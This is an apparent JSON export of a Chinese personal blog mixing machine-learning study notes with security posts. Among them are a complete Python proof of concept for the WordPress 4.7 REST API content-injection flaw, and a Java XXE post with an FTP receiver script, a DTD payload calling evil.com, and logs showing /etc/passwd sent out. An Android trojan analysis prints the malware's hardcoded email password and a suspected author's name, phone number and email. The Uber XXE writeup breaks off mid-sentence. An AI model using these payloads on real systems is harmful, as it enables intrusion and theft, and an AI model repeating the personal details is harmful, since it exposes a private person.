[{"title":"神经网络模型","date":"2017-02-20T00:12:16.000Z","path":"2017/02/20/机器学习/神经网络/","text":"神经网络介绍神经网络模型就像是人的大脑一样，利用单个或少数几个处理单元进行工作，模拟大脑中神经元处理信息一样 一个人工神经网络( Artificial neural network, ANN）简称神经网络（NN) 就是要在当代数字计算机现有规模的约束下，来模拟这种大量的并行性, 并在实现这一工作时，使它能显示许多和人或动物大脑相类似的特性 简单介绍见图： w成为权重，进入网络中的每个输入值都会与w相联系，决定了神经网络整体的活跃性。 大圆可看成是一个“核”细胞，对输入的经过权重调整后的输入全部加起来。形成单个的激励值，因此可称为“激励函数”，激励值绝对了神经细胞的输出，如果超过某个阈值，则产生1的输出，低于阈值，则输出0 但是这个结果不是0就是1，是阶跃函数，无法连续，为了更好的控制激励函数的连续性，在这里用logistic sigmoid function来表示函数。 其函数图像是： 数学基础假设一个网络细胞有n个输入，n代表总数，用数学表示为 X_1,X_2,X_3,.......X_n 同样的权重表示为： W_1,W_2,W_3......W_n 那么激励值则可以表示为： a=W_1*X_1+W_2*X_2+W_3*X_3+.........+W_n*X_n 可以用： 其中改表达式可以写成矩阵形式： A=XW&#39; 用程序表示 123sum=0for i in range(1,n): sum=sum+x(i)*w(i) 上面的logistic sigmoid function函数表示： 当神经细胞的激励值趋于正、负无穷时，S形函数分别趋于１或０。负的激励值对应的函数值都0.5。 e是数学常数，近似等于2.7183，a是神经细胞的激励值，它是函数的自变量，而p是一个用来控制曲线形状变化快慢或陡峭性的参数。p通常设定为1。当p赋以较大值时，曲线就显得平坦，反之，就会使曲线变为陡峭。 基础理解神经网络一般模型： 改网络分为3层：输入层、隐藏层、输出层 其中隐藏层可能存在多个 下面直接用例子进行展示神经网络的模式识别 例如，如下图： 是个数字识别，图中有8*8的格子组成面板，每个格子有两个状态，亮或者暗，这样就能展示出数字 在这里接收面板的状态作为输入，然后输出一个1或0；输出1代表ANN确认已显示了数字“4”，而输出0表示没有显示“4”。因此，神经网络需要有64个输入(每一个输入代表面板的一个具体格点) 和由许多神经细胞组成的一个隐藏层，还有仅有一个神经细胞的输出层，隐藏层的所有输出都馈送到它 一旦神经网络体系创建成功后，它必须接受训练来认出数字“4”。为此可用这样一种方法来完成： 先把神经网的所有权重初始化为任意值。然后给它一系列的输入， 在本例中，就是代表面板不同配置的输入。对每一种输入配置，我们检查它的输出是什么，并调整相应的权重。 如果我们送给网络的输入模式不是“4”， 则我们知道网络应该输出一个0。 因此每个非“4”字符时的网络权重应进行调节，使得它的输出趋向于0。 当代表“4”的模式输送给网络时，则应把权重调整到使输出趋向于1。 规范化：规范化可以将网络的输入变少，这样神经细胞的数目也将会变少 偏移（bias）：前面说的阈值（t），用方程表示：W_1*X_1+W_2*X_2+W_3*X_3+.........+W_n*X_n&gt;t变化下：W_1*X_1+W_2*X_2+W_3*X_3+.........+W_n*X_n+(-1)*t&gt;0t即为偏移量","tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://adrain09.github.io/tags/机器学习/"}]},{"title":"线性回归模型","date":"2017-02-16T00:12:16.000Z","path":"2017/02/16/机器学习/线性回归/","text":"线性回归算法包括几个重要知识点： 线性回归的定义 代价函数 梯度下降法 多变量线性回归 线性回归线性回归属于监督学习，首先有一定量的训练集，根据训练集学习一个线性函数，然后对改函数进行测试，是否足够拟合出所有的数据，找出代价函数最小值的即可 线性回归函数单变量的情况下为线性函数，给出线性函数的模型： 代价函数代价函数是用来查看给出的theta参数的好坏程度的，代价函数可以看成是每个x代入线性函数中计算出来的值与真实值之间的误差 给出代价函数的定义： 其中（x上标i）表示向量x中的第i个元素 比如给定数据集(1,1)、(2,2)、(3,3)则x = [1;2;3]，y = [1;2;3] （此处的语法为Octave语言的语法，表示31的矩阵）如果我们预测theta0 = 0，theta1 = 1，则h(x) = x，则cost function：J(0,1) = 1/(23) [(h(1)-1)^2+(h(2)-2)^2+(h(3)-3)^2] = 0；如果我们预测theta0 = 0，theta1 = 0.5，则h(x) = 0.5x，则cost function：J(0,0.5) = 1/(23) * [(h(1)-1)^2+(h(2)-2)^2+(h(3)-3)^2] = 0.58； 梯度下降怎样找theta0 和theta1 的值使得代价函数最小，就用到了梯度下降法 方法： (1)先确定向下一步的步伐大小，我们称为Learning rate；(2)任意给定一个初始值：theta0 和theta1；(3)确定一个向下的方向，并向下走预先规定的步伐，并更新；(4)当下降的高度小于某个定义的值，则停止下降； 梯度下降就是找函数图像在该点下降速度最快的方向，那么可以看成是函数在该点的导数，如下： 下降后对函数进行更新进行下一次的迭代 下降过程中需要加快下降的速度，将对各个训练值进行归一化处理 其中alefa的值的大小也是需要进行处理，否则可能产生迭代慢或者数字爆炸问题 PS: 进行预测的值也要进行归一化处理，否则会产生很大的误差 多变量线性回归当训练值不单单是唯一特征值，在存在多个特征值的基础上产生了多变量的线性回归 多变量线性回归模型： 代价函数如上是一样的，只是变量值变为theta0——thetan 梯度下降算法变为： Normal Equation模型：theta=inv(X&#39;*X)*X&#39;*y; 和梯度下降的区别： 优势：Normal Equation可以不在意x特征的scale。比如，有特征向量X={x1, x2}, 其中x1的range为1~2000，而x2的range为1~4，可以看到它们的范围相差了500倍。如果使用Gradient Descent方法的话，会导致椭圆变得很窄很长，而出现梯度下降困难，甚至无法下降梯度（因为导数乘上步长后可能会冲出椭圆的外面）。但是，如果用Normal Equation方法的话，就不用担心这个问题了。因为它是纯粹的矩阵算法。 劣势：相比于Gradient Descent，Normal Equation需要大量的矩阵运算，特别是求矩阵的逆。在矩阵很大的情况下，会大大增加计算复杂性以及对计算机内存容量的要求。","tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://adrain09.github.io/tags/机器学习/"}]},{"title":"android木马分析","date":"2017-02-14T01:12:16.000Z","path":"2017/02/14/移动安全/android木马分析/android木马/","text":"同事发来一封邮件说是朋友收到一条短信，打开后没有任何东西，还好手机是iphone手机，短信内容是个连接地址，地址中点击之后是两个apk 下载下来，jeb直接打开，看代码： 12345678910111213static &#123; a.a = 0; a.b = \"cbb\"; a.c = \"15640652168\"; a.d = \"18173516177@189.cn\"; a.e = \"qqq123412\"; a.f = \"18173516177@189.cn\"; a.g = \"smtp.189.cn\"; a.h = \"25\"; a.i = \"\"; a.j = \"\"; a.k = a.c; a.l = \"\"; 黑客的邮箱和手机信息 登入黑客的邮箱： 验证码邮件： 账单邮件： 转账邮件： 查找域名： adadh.com whois信息： 联系人 mayuhai[whois反查]联系方式baiduvrenzheng@163.com [whois反查]手机：15202519032 去微信和支付宝搜索手机均做限制无法查询 同时该联系人注册多个域名用户发送木马apk google搜索mayuhai，查找到马玉海，并且有个人github和一些论坛，都是探讨android的 搜索邮箱没有发现有用的东西","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"泰坦尼克号生存预测","date":"2017-02-10T07:12:16.000Z","path":"2017/02/10/机器学习/titanic_survival_exploration/titanic_survival_exploration/","text":"这个是udacity的练习，应该是使用了决策树的模型,模型最终实现了80%以上的准确率，很基础的东西。在此记录下。 1912年，泰坦尼克号在第一次航行中就与冰山相撞沉没，导致了大部分乘客和船员身亡。在这个入门项目中，我们将探索部分泰坦尼克号旅客名单，来确定哪些特征可以最好地预测一个人是否会生还。为了完成这个项目，你将需要实现几个基于条件的预测并回答下面的问题。我们将根据代码的完成度和对问题的解答来对你提交的项目的进行评估。 提示：这样的文字将会指导你如何使用 iPython Notebook 来完成项目。 点击这里查看本文件的英文版本。 开始当我们开始处理泰坦尼克号乘客数据时，会先导入我们需要的功能模块以及将数据加载到 pandas DataFrame。运行下面区域中的代码加载数据，并使用 .head() 函数显示前几项乘客数据。 提示：你可以通过单击代码区域，然后使用键盘快捷键 Shift+Enter 或 Shift+ Return 来运行代码。或者在选择代码后使用播放（run cell）按钮执行代码。像这样的 MarkDown 文本可以通过双击编辑，并使用这些相同的快捷键保存。Markdown 允许你编写易读的纯文本并且可以转换为 HTML。 1234567891011121314151617import numpy as npimport pandas as pd# RMS Titanic data visualization code# 数据可视化代码from titanic_visualizations import survival_statsfrom IPython.display import display%matplotlib inline# Load the dataset# 加载数据集in_file = 'titanic_data.csv'full_data = pd.read_csv(in_file)# Print the first few entries of the RMS Titanic data# 显示数据列表中的前几项乘客数据display(full_data.head()) PassengerId Survived Pclass Name Sex Age SibSp Parch Ticket Fare Cabin Embarked 0 1 0 3 Braund, Mr. Owen Harris male 22.0 1 0 A/5 21171 7.2500 NaN S 1 2 1 1 Cumings, Mrs. John Bradley (Florence Briggs Th… female 38.0 1 0 PC 17599 71.2833 C85 C 2 3 1 3 Heikkinen, Miss. Laina female 26.0 0 0 STON/O2. 3101282 7.9250 NaN S 3 4 1 1 Futrelle, Mrs. Jacques Heath (Lily May Peel) female 35.0 1 0 113803 53.1000 C123 S 4 5 0 3 Allen, Mr. William Henry male 35.0 0 0 373450 8.0500 NaN S 从泰坦尼克号的数据样本中，我们可以看到船上每位旅客的特征 Survived：是否存活（0代表否，1代表是） Pclass：社会阶级（1代表上层阶级，2代表中层阶级，3代表底层阶级） Name：船上乘客的名字 Sex：船上乘客的性别 Age:船上乘客的年龄（可能存在 NaN） SibSp：乘客在船上的兄弟姐妹和配偶的数量 Parch：乘客在船上的父母以及小孩的数量 Ticket：乘客船票的编号 Fare：乘客为船票支付的费用 Cabin：乘客所在船舱的编号（可能存在 NaN） Embarked：乘客上船的港口（C 代表从 Cherbourg 登船，Q 代表从 Queenstown 登船，S 代表从 Southampton 登船） 因为我们感兴趣的是每个乘客或船员是否在事故中活了下来。可以将 Survived 这一特征从这个数据集移除，并且用一个单独的变量 outcomes 来存储。它也做为我们要预测的目标。 运行该代码，从数据集中移除 Survived 这个特征，并将它存储在变量 outcomes 中。 12345678# Store the 'Survived' feature in a new variable and remove it from the dataset# 从数据集中移除 'Survived' 这个特征，并将它存储在一个新的变量中。outcomes = full_data['Survived']data = full_data.drop('Survived', axis = 1)# Show the new dataset with 'Survived' removed# 显示已移除 'Survived' 特征的数据集display(data.head()) PassengerId Pclass Name Sex Age SibSp Parch Ticket Fare Cabin Embarked 0 1 3 Braund, Mr. Owen Harris male 22.0 1 0 A/5 21171 7.2500 NaN S 1 2 1 Cumings, Mrs. John Bradley (Florence Briggs Th… female 38.0 1 0 PC 17599 71.2833 C85 C 2 3 3 Heikkinen, Miss. Laina female 26.0 0 0 STON/O2. 3101282 7.9250 NaN S 3 4 1 Futrelle, Mrs. Jacques Heath (Lily May Peel) female 35.0 1 0 113803 53.1000 C123 S 4 5 3 Allen, Mr. William Henry male 35.0 0 0 373450 8.0500 NaN S 这个例子展示了如何将泰坦尼克号的 Survived 数据从 DataFrame 移除。注意到 data（乘客数据）和 outcomes （是否存活）现在已经匹配好。这意味着对于任何乘客的 data.loc[i] 都有对应的存活的结果 outcome[i]。 为了验证我们预测的结果，我们需要一个标准来给我们的预测打分。因为我们最感兴趣的是我们预测的准确率，既正确预测乘客存活的比例。运行下面的代码来创建我们的 accuracy_score 函数以对前五名乘客的预测来做测试。 思考题：从第六个乘客算起，如果我们预测他们全部都存活，你觉得我们预测的准确率是多少？ 123456789101112131415161718def accuracy_score(truth, pred): \"\"\" Returns accuracy score for input truth and predictions. \"\"\" # Ensure that the number of predictions matches number of outcomes # 确保预测的数量与结果的数量一致 if len(truth) == len(pred): # Calculate and return the accuracy as a percent # 计算预测准确率（百分比） return \"Predictions have an accuracy of &#123;:.2f&#125;%.\".format((truth == pred).mean()*100) else: return \"Number of predictions does not match number of outcomes!\"# Test the 'accuracy_score' function# 测试 'accuracy_score' 函数predictions = pd.Series(np.ones(5, dtype = int))print accuracy_score(outcomes[:5], predictions) Predictions have an accuracy of 60.00%. 提示：如果你保存 iPython Notebook，代码运行的输出也将被保存。但是，一旦你重新打开项目，你的工作区将会被重置。请确保每次都从上次离开的地方运行代码来重新生成变量和函数。 预测如果我们要预测泰坦尼克号上的乘客是否存活，但是我们又对他们一无所知，那么最好的预测就是船上的人无一幸免。这是因为，我们可以假定当船沉没的时候大多数乘客都遇难了。下面的 predictions_0 函数就预测船上的乘客全部遇难。 1234567891011121314151617def predictions_0(data): \"\"\" Model with no features. Always predicts a passenger did not survive. \"\"\" predictions = [] for _, passenger in data.iterrows(): # Predict the survival of 'passenger' # 预测 'passenger' 的生还率 predictions.append(0) # Return our predictions # 返回预测结果 return pd.Series(predictions)# Make the predictions# 进行预测predictions = predictions_0(data) 问题1对比真实的泰坦尼克号的数据，如果我们做一个所有乘客都没有存活的预测，你认为这个预测的准确率能达到多少？ 提示：运行下面的代码来查看预测的准确率。 1print accuracy_score(outcomes, predictions) Predictions have an accuracy of 61.62%. 回答: 61.62% 我们可以使用 survival_stats 函数来看看 Sex 这一特征对乘客的存活率有多大影响。这个函数定义在名为 titanic_visualizations.py 的 Python 脚本文件中，我们的项目提供了这个文件。传递给函数的前两个参数分别是泰坦尼克号的乘客数据和乘客的 生还结果。第三个参数表明我们会依据哪个特征来绘制图形。 运行下面的代码绘制出依据乘客性别计算存活率的柱形图。 1survival_stats(data, outcomes, 'Sex') 观察泰坦尼克号上乘客存活的数据统计，我们可以发现大部分男性乘客在船沉没的时候都遇难了。相反的，大部分女性乘客都在事故中生还。让我们在先前推断的基础上继续创建：如果乘客是男性，那么我们就预测他们遇难；如果乘客是女性，那么我们预测他们在事故中活了下来。 将下面的代码补充完整，让函数可以进行正确预测。 提示：您可以用访问 dictionary（字典）的方法来访问船上乘客的每个特征对应的值。例如， passenger[&#39;Sex&#39;] 返回乘客的性别。 12345678910111213141516171819202122def predictions_1(data): \"\"\" Model with one feature: - Predict a passenger survived if they are female. \"\"\" predictions = [] for _, passenger in data.iterrows(): # Remove the 'pass' statement below # 移除下方的 'pass' 声明 # and write your prediction conditions here # 输入你自己的预测条件 if passenger['Sex']==\"male\": predictions.append(0) elif passenger['Sex']=='female': predictions.append(1) # Return our predictions # 返回预测结果 return pd.Series(predictions)# Make the predictions# 进行预测predictions = predictions_1(data) 问题2当我们预测船上女性乘客全部存活，而剩下的人全部遇难，那么我们预测的准确率会达到多少？ 提示：运行下面的代码来查看我们预测的准确率。 1print accuracy_score(outcomes, predictions) Predictions have an accuracy of 78.68%. 回答: 78.68% 仅仅使用乘客性别（Sex）这一特征，我们预测的准确性就有了明显的提高。现在再看一下使用额外的特征能否更进一步提升我们的预测准确度。例如，综合考虑所有在泰坦尼克号上的男性乘客：我们是否找到这些乘客中的一个子集，他们的存活概率较高。让我们再次使用 survival_stats 函数来看看每位男性乘客的年龄（Age）。这一次，我们将使用第四个参数来限定柱形图中只有男性乘客。 运行下面这段代码，把男性基于年龄的生存结果绘制出来。 1survival_stats(data, outcomes, 'Age', [\"Sex == 'male'\"]) 仔细观察泰坦尼克号存活的数据统计，在船沉没的时候，大部分小于10岁的男孩都活着，而大多数10岁以上的男性都随着船的沉没而遇难。让我们继续在先前预测的基础上构建：如果乘客是女性，那么我们就预测她们全部存活；如果乘客是男性并且小于10岁，我们也会预测他们全部存活；所有其它我们就预测他们都没有幸存。 将下面缺失的代码补充完整，让我们的函数可以实现预测。提示: 您可以用之前 predictions_1 的代码作为开始来修改代码，实现新的预测函数。 123456789101112131415161718192021222324252627def predictions_2(data): \"\"\" Model with two features: - Predict a passenger survived if they are female. - Predict a passenger survived if they are male and younger than 10. \"\"\" predictions = [] for _, passenger in data.iterrows(): # Remove the 'pass' statement below # 移除下方的 'pass' 声明 # and write your prediction conditions here # 输入你自己的预测条件 if passenger['Sex']==\"male\": if passenger['Age']&lt;10: predictions.append(1) else: predictions.append(0) elif passenger['Sex']=='female': predictions.append(1) # Return our predictions # 返回预测结果 return pd.Series(predictions)# Make the predictions# 进行预测predictions = predictions_2(data) 问题3当预测所有女性以及小于10岁的男性都存活的时候，预测的准确率会达到多少？ 提示：运行下面的代码来查看预测的准确率。 1print accuracy_score(outcomes, predictions) Predictions have an accuracy of 79.35%. 回答: 79.35% 添加年龄（Age）特征与性别（Sex）的结合比单独使用性别（Sex）也提高了不少准确度。现在该你来做预测了：找到一系列的特征和条件来对数据进行划分，使得预测结果提高到80%以上。这可能需要多个特性和多个层次的条件语句才会成功。你可以在不同的条件下多次使用相同的特征。Pclass，Sex，Age，SibSp 和 Parch 是建议尝试使用的特征。 使用 survival_stats 函数来观测泰坦尼克号上乘客存活的数据统计。提示: 要使用多个过滤条件，把每一个条件放在一个列表里作为最后一个参数传递进去。例如: [&quot;Sex == &#39;male&#39;&quot;, &quot;Age &lt; 18&quot;] 1survival_stats(data, outcomes, \"Fare\", [\"Parch &lt; 1\"]) 当查看和研究了图形化的泰坦尼克号上乘客的数据统计后，请补全下面这段代码中缺失的部分，使得函数可以返回你的预测。在到达最终的预测模型前请确保记录你尝试过的各种特征和条件。提示: 您可以用之前 predictions_2 的代码作为开始来修改代码，实现新的预测函数。 12345678910111213141516171819202122232425262728293031323334def predictions_3(data): \"\"\" Model with multiple features. Makes a prediction with an accuracy of at least 80%. \"\"\" predictions = [] for _, passenger in data.iterrows(): # Remove the 'pass' statement below # and write your prediction conditions here if passenger['Sex']==\"male\": if passenger['Age']&lt; 10: predictions.append(1) elif passenger['Pclass'] == 1 and (passenger['Age']&gt;10 and passenger['Age']&lt;40): if passenger['Fare'] &gt; 20: predictions.append(1) elif passenger['SibSp']+passenger['Parch'] &gt; 1 : predictions.append(1) else: predictions.append(0) else: predictions.append(0) elif passenger['Sex']=='female': if passenger['Pclass'] == 3: if passenger['Embarked'] == 'C' or passenger['Embarked'] == 'Q': predictions.append(1) else: predictions.append(0) else: predictions.append(1) # Return our predictions return pd.Series(predictions)# Make the predictionspredictions = predictions_3(data) 结论请描述你实现80%准确度的预测模型所经历的步骤。您观察过哪些特征？某些特性是否比其他特征更有帮助？你用了什么条件来预测生还结果？你最终的预测的准确率是多少？提示:运行下面的代码来查看你的预测准确度。 1print accuracy_score(outcomes, predictions) Predictions have an accuracy of 82.15%. 回答: 82.15% 结论经过了数次对数据的探索和分类，你创建了一个预测泰坦尼克号乘客存活率的有用的算法。在这个项目中你手动地实现了一个简单的机器学习模型——决策树（decision tree）。决策树每次按照一个特征把数据分割成越来越小的群组（被称为 nodes）。每次数据的一个子集被分出来，如果分割结果的子集中的数据比之前更同质（包含近似的标签），我们的预测也就更加准确。电脑来帮助我们做这件事会比手动做更彻底，更精确。这个链接提供了另一个使用决策树做机器学习入门的例子。 决策树是许多监督学习算法中的一种。在监督学习中，我们关心的是使用数据的特征并根据数据的结果标签进行预测或建模。也就是说，每一组数据都有一个真正的结果值，不论是像泰坦尼克号生存数据集一样的标签，或者是连续的房价预测。 问题5想象一个真实世界中应用监督学习的场景，你期望预测的结果是什么？举出两个在这个场景中能够帮助你进行预测的数据集中的特征。 回答: 房价的预测，影响房价的因素有离市中心的远近、交通轨道的数量、环境的好坏程度 注意: 当你写完了所有的代码，并且回答了所有的问题。你就可以把你的 iPython Notebook 导出成 HTML 文件。你可以在菜单栏，这样导出File -&gt; Download as -&gt; HTML (.html) 把这个 HTML 和这个 iPython notebook 一起做为你的作业提交。 翻译：毛礼建 ｜ 校译：黄强 ｜ 审译：曹晨巍","tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://adrain09.github.io/tags/机器学习/"}]},{"title":"常见机器学习算法","date":"2017-02-09T07:12:16.000Z","path":"2017/02/09/机器学习/常用机器学习算法/","text":"对机器学习算法的通俗理解 决策树对已知的feature进行分类，每个节点提一个问题，通过判断将数据分类，再进行提问，再进行分类 来新的数据后，按照问题逐个按问题分类最终进入到合适的叶子上面 线性回归给定多个数值，拟合出与各个点的距离最近的一条直线，以直线作为分类标准，来新的数据后，判断数据在坐标系下处于直线的位置来进行分类判断 逻辑回归更加挑剔的线性回归，对边界更加严格 支持向量机感觉就是在回归里面再去重新选择最优解，所有距离最小，但是距离最小值最大的那个解 神经网络输入后经过内部函数的处理，基于标签分成不同的区域，在输出层输出单一结果 核函数多维处理，空间划分","tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://adrain09.github.io/tags/机器学习/"}]},{"title":"互联网企业安全建设","date":"2017-02-06T07:12:16.000Z","path":"2017/02/06/安全管理/互联网企业安全/","text":"安全理论一 安全大环境 根据企业自身的产业地位、it总投入能力、商业模式、业务需求为目标，建立的安全解决方案以及保证方案实践有效性进行的一系列系统化和工程化的安全日常集合 安全是一个保值性的后台职能，不是创造收益的前台职能 企业安全的领域：网络安全、平台和业务安全、广义信息安全、IT风险管理、IT审计和内控、安全品牌营销和渠道管理、其他打杂 二 互联网安全特点 大型互联网企业需要面对的问题：海量IDC和数据、分布式架构、业务频繁发布和更新 传统公司安全建设：边界硬件防火墙、IPS/IDS，WAF，扫描器、堡垒机、在服务器上安装杀软，集成各种设备保证安全，管理手段重视ISMS，重视制度和流程、审计等 互联网安全建设：生产网络和办公网网络，攻防驱动， 自研或者对开源扫描器二次开发+无线水平拓展的软件架构+构建在中低端硬件之上+大数据机器学习的建设方式 三 不同规模企业安全特定 创业性：保证最基本的部分、追求最大性价比、不求大而全。 基本补丁管理漏洞管理基本ACL密码管理帐号权限管理安全开发规范系统安全加固 大中型企业：开始有自己的安全团队，整体安全建设 大型互联网企业 四 甲方安全 三张表：组织架构图（开展业务基础，与安全相关的干系人）、线上产品域交付团队对应关系图（应急响应）、资产管理表（安全工作开展） 历史遗留问题：历史安全问题处理情况 初期三件事：安全基线、监控机制、应急响应 推动安全策略：公司层面（自上而下，安全建设成本和收益）、战术层面（部门合作） SDL STRIDE威胁建模 实用参考: ITIL(BS15000/ISO20000)、SDL、ISO27001 业务持续性管理：业务影响分析、恢复策略、实施、测试和演练 应急响应：紧急事件检测、初始响应、事件分级、调查 五 大数据安全安全的后续建设 防御架构原则防守对抗体系建设三部曲 信息对抗、技术对抗、运营能力对抗 信息对抗 目的：知己知彼。 从两个方面进行：数据化和社会化。 数据化是指企业自身安全风险建设和分析，需要根据基线数据、拓扑数据、业务数据梳理清楚可能存在的攻击路径和攻击面，针对性防御。 技术对抗 高维防守、建立优势、过程化 运营能力对抗 风险闭环、执行力 安全理念 快速检查、有效邮箱、快速溯源、快速恢复 纵深防御 安全域划分、基于数据链路层的隔离、端口状态协议过滤、应用层安全、系统加固、灾难恢复 安全架构设计原则 纵深防御、多维防御、降维防御、实时入侵检测、伸缩性和可拓展性、分布式IDC、自动化运维、低性能损耗、能旁路不串联、业务无感知、去信息孤岛、TCO可控 安全建设一 基础安全措施（一）安全域划分 （二）生产网络和办公网络 （三）系统安全加固 （四）应用配置加固 目录权限 web进程非root 过滤特定文件类型 远程访问 帐号密码 网络访问控制 补丁管理 日志审计 （五）服务器4A 4A指的是：账户、认证、授权、审计 SSO统一登入权限管理：LDAP方案和0堡垒机方案 二 网络层安全（一）网络入侵检测 传统NIDS 开源SNORT 大型全流量NIDS （二）DDOS防御（三）链路劫持 全站https 登入过程加密 跨IDC传输加密 （四）应用防火墙waf通过部署方式分为：cname部署、module部署、网络层部署WAF两类规则：通用型主流漏洞检测和防护、0day检测和防护 三 入侵感知（一）主机入侵检测 OSSEC MIG OSquery 自研 采集点：基线安全、日志收集、进程信息、网络连接信息、webshell、DB审计 （二）检测webshell 静态检测 流量检测 （三）RASP，实时自我保护 PHP RASP（动态行为分析） JAVA RASP （四）数据库审计 旁路型 主机型 代理型 攻击检测 （五）入侵检测平台 （六）入侵检测数据模型 四 漏洞扫描（一）ACL扫描 （二）弱口令扫描 （三）系统及应用服务扫描 （四）web漏洞扫描 五 移动安全六 代码审计七 办公网安全八 安全管理九 隐私保护（一）数据分类 （二）数据隔离 （三）数据加密 TDE透明数据加密 应用加密 FPE 文件磁盘加密 噪声混淆 （四）密钥管理 （五）安全删除 （六）匿名化 （七）内容分级 十 业务安全和风控安全实践","tags":[{"name":"安全管理","slug":"安全管理","permalink":"https://adrain09.github.io/tags/安全管理/"}]},{"title":"WordPress REST API 内容注入/权限提升漏洞","date":"2017-02-06T03:12:16.000Z","path":"2017/02/06/漏洞记录/WordPress REST API 内容注入_权限提升漏洞/","text":"WordPress 在 4.7.0 版本后集成了原 REST API 插件的功能，并默认启用，设置为非Plain模式，使用 WordPress 程序的网站首页上会有： 1&lt;link rel=&quot;https://&quot; href=&quot;http://wp-json/&quot;&gt; API 地址则为：http://wp-json/，通过该API的GET和POST请求，未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改，严重情况下，可以出现敏感数据泄露。 poc： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import jsonimport sysimport urllib2from lxml import etreedef get_api_url(wordpress_url): response = urllib2.urlopen(wordpress_url) data = etree.HTML(response.read()) u = data.xpath('//link[@rel=\"https://api.w.org/\"]/@href')[0] # check if we have permalinks if 'rest_route' in u: print(' ! Warning, looks like permalinks are not enabled. This might not work!') return udef get_posts(api_base): respone = urllib2.urlopen(api_base + 'wp/v2/posts') posts = json.loads(respone.read()) for post in posts: print(' - Post ID: &#123;&#125;, Title: &#123;&#125;, Url: &#123;&#125;' .format(post['id'], post['title']['rendered'], post['link']))def update_post(api_base, post_id, post_content): # more than just the content field can be updated. see the api docs here: # https://developer.wordpress.org/rest-api/reference/posts/#update-a-post data = json.dumps(&#123; 'content': post_content &#125;) url = api_base + 'wp/v2/posts/&#123;post_id&#125;/?id=&#123;post_id&#125;abc'.format(post_id=post_id) req = urllib2.Request(url, data, &#123;'Content-Type': 'application/json'&#125;) response = urllib2.urlopen(req).read() print('* Post updated. Check it out at &#123;&#125;'.format(json.loads(response)['link']))def print_usage(): print('Usage: &#123;&#125; &lt;url&gt; (optional: &lt;post_id&gt; &lt;file with post_content&gt;)'.format(__file__))if __name__ == '__main__': # ensure we have at least a url if len(sys.argv) &lt; 2: print_usage() sys.exit(1) # if we have a post id, we need content too if 2 &lt; len(sys.argv) &lt; 4: print('Please provide a file with post content with a post id') print_usage() sys.exit(1) print('* Discovering API Endpoint') api_url = get_api_url(sys.argv[1]) print('* API lives at: &#123;&#125;'.format(api_url)) # if we only have a url, show the posts we have have if len(sys.argv) &lt; 3: print('* Getting available posts') get_posts(api_url) sys.exit(0) # if we get here, we have what we need to update a post! print('* Updating post &#123;&#125;'.format(sys.argv[2])) with open(sys.argv[3], 'r') as content: new_content = content.readlines() update_post(api_url, sys.argv[2], ''.join(new_content)) print('* Update complete!')","tags":[{"name":"漏洞记录","slug":"漏洞记录","permalink":"https://adrain09.github.io/tags/漏洞记录/"}]},{"title":"java 1.7+ xxe入侵","date":"2017-02-05T03:12:16.000Z","path":"2017/02/05/web安全/JAVA1.7+ XXE实体入侵/","text":"Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出： 错误： 12345678java.net.MalformedURLException: Illegal character in URLat sun.net.www.http.HttpClient.getURLFile(HttpClient.java:583)at sun.net.www.protocol.http.HttpURLConnection.getRequestURI(HttpURLConnection.java:2298)at sun.net.www.protocol.http.HttpURLConnection.writeRequests(HttpURLConnection.java:513)...at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:141)at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:243)at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:347) XMLParser处理xml，提供了xml实体注入的风险 要利用这个问题，可采用ftp方式接受服务器的数据信息： 脚本地址：https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb 12345678910111213141516171819202122232425262728293031require 'socket'server = TCPServer.new 8000loop do Thread.start(server.accept) do |client| puts \"New client connected\" data = \"\" client.puts(\"220 xxe-ftp-server\") loop &#123; req = client.gets() puts \"&lt; \"+req if req.include? \"USER\" client.puts(\"331 password please - version check\") else puts \"&gt; 230 more data please!\" client.puts(\"230 more data please!\") end &#125; endend’‘’利用poc：```xml&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % asd SYSTEM \"http://evil.com/ext.dtd\"&gt; %asd; %rrr;]&gt;&lt;a&gt;&lt;/a&gt; 外部dtd： 12&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &apos;ftp://evil.com:8000/%b;&apos;&gt;&quot;&gt; 利用输入传递数据到ftp命令中去： 123456789101112131415New client connected&lt; USER anonymous&lt; PASS Java1.7.0_45@&gt; 230 more data please!&lt; TYPE I&gt; 230 more data please!&lt; CWD root:x:0:0:root:&gt; 230 more data please!&lt; CWD root:&gt; 230 more data please!&lt; CWD bin&gt; 230 more data please!&lt; CWD bash&gt; 230 more data please!&lt; daemon:x:1:1:daemon:","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"Uber xxe漏洞","date":"2017-02-05T03:12:16.000Z","path":"2017/02/05/安全测试/XXE in uber/","text":"源地址：https://httpsonly.blogspot.in/2017/01/0day-writeup-xxe-in-ubercom.html?m=1 奖金：$9000 在参与uber的漏洞奖励计划时候，找到了uber的一个系统地址： https://backup.uberinternal.com:4285/login/ 通过查看api地址：https://backup.uberinternal.com:4285/api/serverEnv 可以看到用的code42的版本信息，通过查找cve并没有发现漏洞 再查看说明文档测试api信息，在地址： https://www.crashplan.com/apidocviewer/#SsoAuthLoginResponse 可以接受外部数据的输入 api/api/SsoAuthLoginResponse接受参数SAMLResponse，参数值是个base64加密后的xml认证数据，构造传统的xxe攻击代码，服务器返回UA为java 1.8+ 在java1.7+ 是存在xxe命令执行漏洞的 利用的poc： 利用ftp服务器把数据传递出来，详细见：《java 1.7+ 